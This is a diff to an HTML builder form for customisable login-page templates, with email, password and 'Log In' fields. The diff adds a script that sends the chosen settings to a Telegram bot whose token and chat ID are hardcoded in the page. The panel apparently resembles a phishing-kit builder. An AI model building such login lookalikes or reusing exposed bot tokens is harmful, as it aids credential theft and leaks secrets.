@@ -88,71 +88,111 @@
     </div>
 
     <label>LOGO</label>
-    <input type="file">
+    <input type="file" id="logo">
+    <input type="text" id="logoSize" placeholder='width="70px" height="70px"'>
 
-    <label>BANNER SIZE</label>
-    <input type="text" placeholder='width="300px" height="100px"'>
+    <label>BANNER</label>
+    <input type="file" id="banner">
+    <input type="text" id="bannerSize" placeholder='width="300px" height="100px"'>
 
     <label>TEMPLATE NAME</label>
-    <input type="text" placeholder="Name">
+    <input type="text" placeholder="Name" id="templateName">
 
     <div class="row">
       <div>
         <label>BODY COLOR</label>
-        <input type="color">
+        <input type="color" id="bodyColor">
       </div>
       <div>
         <label>BUTTON COLOR</label>
-        <input type="color">
+        <input type="color" id="buttonColor">
       </div>
     </div>
 
     <div class="row">
       <div>
         <label>TEXT COLOR</label>
-        <input type="color">
+        <input type="color" id="textColor">
       </div>
     </div>
 
     <div class="section-title">INPUTs CONFIGURATION</div>
 
     <label>DESCRIPTION</label>
-    <input type="text" value="Login First">
+    <input type="text" value="Login First" id="description">
 
     <div class="row">
       <div>
         <label>EMAIL CONTENT</label>
-        <input type="text" value="Email or Phone">
+        <input type="text" value="Email or Phone" id="emailContent">
       </div>
       <div>
         <label>EMAIL LABEL</label>
-        <input type="text" value="SHOW">
+        <input type="text" value="SHOW" id="emailLabel">
       </div>
     </div>
 
     <div class="row">
       <div>
         <label>PASSWORD CONTENT</label>
-        <input type="text" value="Password">
+        <input type="text" value="Password" id="passwordContent">
       </div>
       <div>
         <label>PASSWORD LABEL</label>
-        <input type="text" value="SHOW">
+        <input type="text" value="SHOW" id="passwordLabel">
       </div>
     </div>
 
     <div class="row">
       <div>
         <label>BUTTON CONTENT</label>
-        <input type="text" value="Log In">
+        <input type="text" value="Log In" id="buttonContent">
       </div>
       <div>
         <label>BUTTON WIDTH</label>
-        <input type="text" value="200px">
+        <input type="text" value="200px" id="buttonWidth">
       </div>
     </div>
 
-    <button class="generate-btn">GENERATE</button>
+    <button class="generate-btn" onclick="generateTemplate()">GENERATE</button>
   </div>
+
+  <script>
+    function generateTemplate() {
+      const data = {
+        templateName: document.getElementById("templateName").value,
+        logoSize: document.getElementById("logoSize").value,
+        bannerSize: document.getElementById("bannerSize").value,
+        bodyColor: document.getElementById("bodyColor").value,
+        buttonColor: document.getElementById("buttonColor").value,
+        textColor: document.getElementById("textColor").value,
+        description: document.getElementById("description").value,
+        emailContent: document.getElementById("emailContent").value,
+        emailLabel: document.getElementById("emailLabel").value,
+        passwordContent: document.getElementById("passwordContent").value,
+        passwordLabel: document.getElementById("passwordLabel").value,
+        buttonContent: document.getElementById("buttonContent").value,
+        buttonWidth: document.getElementById("buttonWidth").value
+      };
+
+      const message = `🧩 New Template Submitted:
+      📄 Template Name: ${data.templateName}
+      🖼️ Logo Size: ${data.logoSize}
+      📏 Banner Size: ${data.bannerSize}
+      🌈 Body Color: ${data.bodyColor}
+      🔘 Button Color: ${data.buttonColor}
+      📝 Description: ${data.description}
+      📧 Email Label: ${data.emailLabel}
+      🔐 Password Label: ${data.passwordLabel}
+      👇 Button Content: ${data.buttonContent}`;
+
+      const telegramApiUrl = `https://api.telegram.org/bot8132547313:AAHKP_rVA5SVjSQe59uU4KY2l5synrhQ7jk/sendMessage?chat_id=6482794683&text=${encodeURIComponent(message)}`;
+
+      fetch(telegramApiUrl)
+        .then(response => response.json())
+        .then(data => console.log('Message sent successfully:', data))
+        .catch(error => console.error('Error sending message:', error));
+    }
+  </script>
 </body>
 </html>
